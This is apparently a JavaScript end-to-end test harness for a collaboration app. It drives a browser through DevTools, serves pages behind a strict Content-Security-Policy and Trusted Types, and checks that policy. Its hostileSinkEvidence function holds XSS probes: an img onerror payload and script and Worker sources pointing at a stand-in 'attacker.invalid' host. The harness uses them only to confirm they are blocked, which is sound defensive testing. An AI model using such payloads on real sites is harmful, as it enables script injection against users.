  await evaluate(profile.client, { expression: `(() => { const matches = Array.from(document.querySelectorAll('button')).filter((candidate) => candidate.textContent?.trim() === ${JSON.stringify(text)} && !candidate.disabled); const button = matches.find((candidate) => !candidate.closest('nav')) ?? matches[0]; button.click(); return true; })()`, userGesture: true });
}

async function waitText(profile, text) { await waitFor(profile, `text ${text}`, `document.body.innerText.includes(${JSON.stringify(text)})`); }
async function waitFor(profile, label, expression) {
  for (let attempt = 0; attempt < 600; attempt += 1) { if (await evaluate(profile.client, { expression })) return; await delay(50); }
  const diagnostic = await evaluate(profile.client, { expression: "({ body: document.body.innerText.slice(0, 4000), bridge: window.__patchmarkHc3Slice4BridgeEvidence, runtimeError: window.__patchmarkHc3Slice4RuntimeError ?? null, policy: window.__patchmarkHc3Slice5PolicyEvents ?? [], runtime: window.__patchmarkHc3Slice5RuntimeEvents ?? [], console: window.__patchmarkHc3Slice5ConsoleEvents ?? [] })" });
  throw new Error(`Timed out waiting for ${label}: ${JSON.stringify(diagnostic)}`);
}
async function setViewport(profile, width, height) { await profile.client.call("Emulation.setDeviceMetricsOverride", { width, height, deviceScaleFactor: 1, mobile: true }); }
async function pressEscape(profile) { await profile.client.call("Input.dispatchKeyEvent", { type: "keyDown", key: "Escape", code: "Escape", windowsVirtualKeyCode: 27 }); await profile.client.call("Input.dispatchKeyEvent", { type: "keyUp", key: "Escape", code: "Escape", windowsVirtualKeyCode: 27 }); }

async function workspaceEvidence(profile) {
  return evaluate(profile.client, { expression: "(() => { const workspace = document.querySelector('[data-testid=\"collaboration-qualification-workspace\"]'); const rect = workspace?.getBoundingClientRect(); const bridge = window.__patchmarkHc3Slice4BridgeEvidence ?? {}; return { workspace: Boolean(workspace), hiddenWorkspace: Boolean(document.querySelector('[data-testid=\"collaboration-qualification-workspace\"][hidden]')), dialogName: workspace?.querySelector('h2')?.textContent ?? null, liveRegion: workspace?.querySelector('[aria-live]')?.getAttribute('aria-live') ?? null, focusedHeading: document.activeElement?.id === 'collaboration-workspace-title', sectionCount: workspace?.querySelector('nav')?.querySelectorAll('button').length ?? 0, capabilityCount: workspace?.querySelectorAll('details li').length ?? 0, noHorizontalOverflow: document.documentElement.scrollWidth <= innerWidth, workspaceWidth: rect?.width ?? 0, bridgeLoaded: bridge.loaded ?? false, driverInspects: bridge.inspects ?? 0, driverInvokes: bridge.invokes ?? 0, driverClosed: bridge.closed ?? 0 }; })()" });
}

function authorityRuntimeSource(role) {
  const configs = {
    prj_hc3_slice4: { role, project_id: "prj_hc3_slice4", project_title: "HC3 Product Source", database_prefix: `patchmark-hc3-slice4-${role}-source`, slice5_fixture: slice5Fixture },
    prj_hc3_slice4_other: { role, project_id: "prj_hc3_slice4_other", project_title: "HC3 Other Project", database_prefix: `patchmark-hc3-slice4-${role}-other`, slice5_fixture: slice5Fixture }
  };
  return `(() => {
    const configs = ${JSON.stringify(configs)};
    const bridge = { loaded: false, inspects: 0, invokes: 0, closed: 0, instanceCount: 0 };
    const instances = new Map();
    let modulePromise = null;
    let activeProject = null;
    const loadModule = () => modulePromise ??= import('/scripts/collaboration-hc3-slice4-product-authority-runtime.ts').then((value) => { bridge.loaded = true; return value; }, (error) => { window.__patchmarkHc3Slice4RuntimeError = error?.stack ?? String(error); throw error; });
    const load = (projectId) => {
      if (!configs[projectId]) throw new Error('No Slice 4 authority fixture is bound to this project.');
      if (!instances.has(projectId)) instances.set(projectId, loadModule().then((module) => { bridge.instanceCount += 1; return module.createSlice4RealProductAuthorityRuntime(configs[projectId]); }));
      return instances.get(projectId);
    };
    window.__patchmarkHc3ProductAuthorityRuntime = {
      async inspect(input) { activeProject = input.project_id; bridge.inspects += 1; return (await load(input.project_id)).runtime.inspect(input); },
      async invoke(input) { activeProject = input.project_id; bridge.invokes += 1; return (await load(input.project_id)).runtime.invoke(input); },
      closeOperationalWork() { bridge.closed += 1; if (activeProject) void load(activeProject).then((value) => value.runtime.closeOperationalWork()); }
    };
    window.__patchmarkHc3Slice4AuthorityHarness = {
      async exportHandoff(kind, projectId = 'prj_hc3_slice4') { return (await load(projectId)).harness.exportHandoff(kind); },
      async importHandoff(kind, value, projectId = 'prj_hc3_slice4') { return (await load(projectId)).harness.importHandoff(kind, value); },
      async attemptRevokedMutation(projectId = 'prj_hc3_slice4') { return (await load(projectId)).harness.attemptRevokedMutation(); },
      async evidence(projectId = 'prj_hc3_slice4') { return (await load(projectId)).harness.evidence(); }
    };
    window.__patchmarkHc3Slice4BridgeEvidence = bridge;
  })();`;
}

async function waitForHttp(url) {
  for (let attempt = 0; attempt < 300; attempt += 1) { try { const response = await fetch(url); if (response.ok) return; } catch {} await delay(100); }
  throw new Error(`HTTP server did not become ready: ${url}`);
}

async function startOptimizedHarnessServer(listenPort) {
  const nonce = "patchmark-hc3-slice5-optimized";
  const policy = optimizedCollaborationPolicy(nonce);
  const assetNames = new Set(readdirSync(optimizedHarnessOutput));
  const server = createServer((request, response) => {
    try {
      const pathname = new URL(request.url ?? "/", "http://127.0.0.1").pathname;
      const role = pathname === "/candidate/" ? "candidate" : pathname === "/owner/" || pathname === "/" ? "owner" : null;
      if (role) {
        const html = instrumentPolicyHtml(`<!doctype html><html data-patchmark-qualification-role="${role}"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HC-3 optimized policy qualification</title><link rel="stylesheet" href="/assets/optimized-harness.css"></head><body><div id="root"></div><script defer src="/assets/optimized-harness.js"></script></body></html>`, nonce);
        response.writeHead(200, {
          "Cache-Control": "no-store",
          "Content-Security-Policy": policy.header,
          "Content-Type": "text/html; charset=utf-8",
          "Cross-Origin-Opener-Policy": "same-origin",
          "Referrer-Policy": "no-referrer",
          "X-Content-Type-Options": "nosniff"
        });
        response.end(html);
        return;
      }
      if (pathname.startsWith("/assets/")) {
        const asset = pathname.slice("/assets/".length);
        if (!assetNames.has(asset) || asset.includes("/") || asset.includes("..")) {
          response.writeHead(404).end();
          return;
        }
        const assetPath = join(optimizedHarnessOutput, asset);
        response.writeHead(200, {
          "Cache-Control": "no-store",
          "Content-Length": statSync(assetPath).size,
          "Content-Type": asset.endsWith(".css") ? "text/css; charset=utf-8" : "text/javascript; charset=utf-8",
          "X-Content-Type-Options": "nosniff"
        });
        response.end(readFileSync(assetPath));
        return;
      }
      response.writeHead(404).end();
    } catch (error) {
      response.writeHead(500, { "Content-Type": "text/plain" });
      response.end(error instanceof Error ? error.message : "Optimized harness failure.");
    }
  });
  await new Promise((resolveListen, rejectListen) => {
    server.once("error", rejectListen);
    server.listen(listenPort, "127.0.0.1", resolveListen);
  });
  return { close: () => new Promise((resolveClose, rejectClose) => {
    server.closeAllConnections?.();
    server.close((error) => error ? rejectClose(error) : resolveClose());
  }) };
}

async function startProductProxy(listenPort, upstreamPort, options = {}) {
  const nonce = "patchmark-hc3-slice5-qualification";
  const server = createServer((request, response) => {
    try {
      const pathname = new URL(request.url ?? "/", "http://127.0.0.1").pathname;
      if (pathname.endsWith(".ts") && (pathname.startsWith("/scripts/") || pathname.startsWith("/lib/collaboration/"))) {
        const sourcePath = safeRepositoryPath(pathname);
        const transpiled = ts.transpileModule(readFileSync(sourcePath, "utf8"), { compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022 }, fileName: sourcePath, reportDiagnostics: true });
        response.writeHead(200, { "Cache-Control": "no-store", "Content-Type": "text/javascript; charset=utf-8" });
        response.end(rewriteBrowserImports(transpiled.outputText));
        return;
      }
      if (pathname.startsWith("/node_modules/") && /\.(?:js|mjs)$/.test(pathname)) {
        response.writeHead(200, { "Cache-Control": "no-store", "Content-Type": "text/javascript; charset=utf-8" });
        response.end(rewriteBrowserImports(readFileSync(safeRepositoryPath(pathname), "utf8")));
        return;
      }
      const upstream = httpRequest({
        hostname: "127.0.0.1",
        port: upstreamPort,
        path: request.url,
        method: request.method,
        headers: { ...request.headers, "accept-encoding": "identity" }
      }, (incoming) => {
        const contentType = `${incoming.headers["content-type"] ?? ""}`;
        if (!options.strictPolicyQualification || !contentType.includes("text/html")) {
          response.writeHead(incoming.statusCode ?? 502, incoming.headers);
          incoming.pipe(response);
          return;
        }
        const chunks = [];
        incoming.on("data", (chunk) => chunks.push(Buffer.from(chunk)));
        incoming.on("end", () => {
          const headers = { ...incoming.headers };
          delete headers["content-length"];
          delete headers["content-encoding"];
          headers["cache-control"] = "no-store";
          headers["content-security-policy"] = strictQualificationPolicy(nonce, listenPort);
          const html = applyStrictQualificationBootstrap(Buffer.concat(chunks).toString("utf8"), nonce);
          response.writeHead(incoming.statusCode ?? 502, headers);
          response.end(html);
        });
      });
      upstream.on("error", (error) => { if (!response.headersSent) response.writeHead(502, { "Content-Type": "text/plain" }); response.end(String(error)); });
      request.pipe(upstream);
    } catch (error) {
      response.writeHead(500, { "Content-Type": "text/plain" });
      response.end(error instanceof Error ? error.stack : String(error));
    }
  });
  await new Promise((resolveListen, rejectListen) => { server.once("error", rejectListen); server.listen(listenPort, "127.0.0.1", resolveListen); });
  return { close: () => new Promise((resolveClose, rejectClose) => server.close((error) => error ? rejectClose(error) : resolveClose())) };
}

function strictQualificationPolicy(nonce, listenPort) {
  return [
    "default-src 'self'",
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    "script-src-attr 'none'",
    `style-src 'self' 'nonce-${nonce}'`,
    "style-src-attr 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self'",
    `connect-src 'self' ws://127.0.0.1:${listenPort}`,
    "media-src 'self' blob:",
    "worker-src 'self' blob:",
    "object-src 'none'",
    "base-uri 'none'",
    "frame-ancestors 'none'",
    "form-action 'self'",
    "manifest-src 'self'",
    "trusted-types default nextjs#bundler",
    "require-trusted-types-for 'script'"
  ].join("; ");
}

function applyStrictQualificationBootstrap(html, nonce) {
  const policy = `<script nonce="${nonce}">(() => { if (!globalThis.trustedTypes) return; trustedTypes.createPolicy("default", { createScriptURL(value) { const url = new URL(String(value), location.href); const allowed = url.origin === location.origin && ["/_next/", "/scripts/", "/lib/", "/node_modules/"].some((prefix) => url.pathname.startsWith(prefix)); if (!allowed) throw new TypeError("Blocked non-qualification script URL."); return url.href; } }); })();</script>`;
  const withNonces = html
    .replaceAll("<script", `<script nonce="${nonce}"`)
    .replaceAll("<style", `<style nonce="${nonce}"`);
  return withNonces.replace(/<head([^>]*)>/i, `<head$1>${policy}`);
}

async function policyEvidence(profile) {
  return evaluate(profile.client, { expression: "structuredClone(window.__patchmarkHc3Slice5PolicyEvents ?? [])" });
}

async function trustedTypePolicyEvidence(profile) {
  return evaluate(profile.client, { expression: "[...(window.__patchmarkHc3Slice5TrustedTypePolicies ?? [])]" });
}

async function hostileSinkEvidence(profile) {
  const result = await evaluate(profile.client, { expression: `(() => {
    const probe = document.createElement('div');
    const script = document.createElement('script');
    const inlineScript = document.createElement('script');
    const attempts = [
      () => { probe.innerHTML = '<img src=x onerror=globalThis.__hc3SinkExecuted=1>'; },
      () => { script.src = 'https://attacker.invalid/hostile.js'; },
      () => { new Worker('https://attacker.invalid/hostile.js'); },
      () => { inlineScript.textContent = 'globalThis.__hc3SinkExecuted=1'; document.head.append(inlineScript); }
    ];
    let blocked = 0;
    const errorNames = [];
    globalThis.__hc3SinkExecuted = 0;
    for (const attempt of attempts) {
      try { attempt(); } catch (error) {
        blocked += 1;
        errorNames.push(error?.name ?? 'Error');
      }
    }
    const evidence = { blocked, side_effects: Number(globalThis.__hc3SinkExecuted), error_names: errorNames };
    delete globalThis.__hc3SinkExecuted;
    return evidence;
  })()` });
  await delay(50);
  const policyEvents = await evaluate(profile.client, { expression: "window.__patchmarkHc3Slice5PolicyEvents.length" });
  await evaluate(profile.client, { expression: "window.__patchmarkHc3Slice5PolicyEvents.splice(0)" });
  return { ...result, policy_events: policyEvents };
}

async function noArtifactInBrowserDiagnostics(profile) {
  return evaluate(profile.client, { expression: `(() => {
    const policy = JSON.stringify(window.__patchmarkHc3Slice5PolicyEvents ?? []);
    const resources = performance.getEntriesByType("resource").map((entry) => entry.name).join("\\n");
    return !/pmhc3\\.|\\.pmcb(?:[?#]|$)/i.test(policy + "\\n" + resources);
  })()` });
}

function rewriteBrowserImports(source) {
  const mappings = {
    "@hpke/core": "/node_modules/@hpke/core/esm/mod.js",
    "@hpke/common": "/node_modules/@hpke/common/esm/mod.js",
    "libsodium-wrappers-sumo": "/node_modules/libsodium-wrappers-sumo/dist/modules-sumo-esm/libsodium-wrappers.mjs",
    "libsodium-sumo": "/node_modules/libsodium-sumo/dist/modules-sumo-esm/libsodium-sumo.mjs"
  };
  let output = source;
  for (const [specifier, mapped] of Object.entries(mappings)) output = output.replaceAll(`"${specifier}"`, `"${mapped}"`).replaceAll(`'${specifier}'`, `'${mapped}'`);
  return output;
}

function safeRepositoryPath(pathname) {
  const value = resolve(repositoryRoot, `.${decodeURIComponent(pathname)}`);
  if (!value.startsWith(`${repositoryRoot}${sep}`)) throw new Error("Module path escaped the repository root.");
  return value;
}

function inspectOptimizedBuild(build) {
  const forbidden = /eval\(|new Function|sourceMappingURL|webpackHotUpdate|react-refresh|React Refresh|Fast Refresh|development overlay|createScriptURL:[A-Za-z_$][\w$]*=>[A-Za-z_$][\w$]*[,}]/;
  const forbiddenHits = [];
  let markerPresent = false;
  let validatorPresent = false;
  for (const asset of build.javascript_assets) {
    const source = readFileSync(join(optimizedHarnessOutput, asset), "utf8");
    if (source.includes("PATCHMARK_HC3_SLICE5_OPTIMIZED_HARNESS_V1")) markerPresent = true;
    if (source.includes("Optimized bundler script URL is outside the fixed same-origin worker boundary.")) validatorPresent = true;
    const match = source.match(forbidden);
    if (match) forbiddenHits.push({ asset, token: match[0] });
  }
  return Object.freeze({ assets: build.javascript_assets, forbidden_hits: forbiddenHits, marker_present: markerPresent, validator_present: validatorPresent });
}

function createProjectFixture(root, input) {
  const metadata = join(root, ".patchmark");
  const now = "2026-08-26T00:00:00.000Z";
  mkdirSync(join(metadata, "documents", input.documentId, "versions"), { recursive: true });
  for (const directory of ["context-packs", "imports", "recovery"]) mkdirSync(join(metadata, "documents", input.documentId, directory), { recursive: true });
  writeFileSync(join(root, "source.md"), input.body);
  writeFileSync(join(metadata, "project.json"), `${JSON.stringify({ format: "patchmark-project", schema_version: 2, project_id: input.projectId, title: input.title, created_at: now, manifest_revision: 1, groups: [], documents: [{ document_id: input.documentId, path: "source.md", display_title: "Source", group_id: null, role: "research", status: "active", position: 1000, added_at: now, archived_at: null }] }, null, 2)}\n`);
  const store = join(metadata, "documents", input.documentId);
  writeFileSync(join(store, "manifest.json"), `${JSON.stringify({ schema_version: 1, project_id: input.projectId, document_id: input.documentId, project_name: input.title, document_file: "document.md", created_at: now, updated_at: now }, null, 2)}\n`);
  writeFileSync(join(store, "comments.json"), "[]\n");
  writeFileSync(join(store, "patches.json"), "[]\n");
  writeFileSync(join(store, "tasks.json"), "[]\n");
  writeFileSync(join(store, "document.json"), `${JSON.stringify({ format: "patchmark-document-store", schema_version: 1, document_id: input.documentId, created_at: now, source: "created" }, null, 2)}\n`);
}

function hashProject(root) {
  const projectInventory = inventoryProject(root);
  const hash = createHash("sha256");
  for (const path of [...projectInventory.files].sort()) hash.update(path).update(readFileSync(join(root, path)));
  return hash.digest("hex");
}
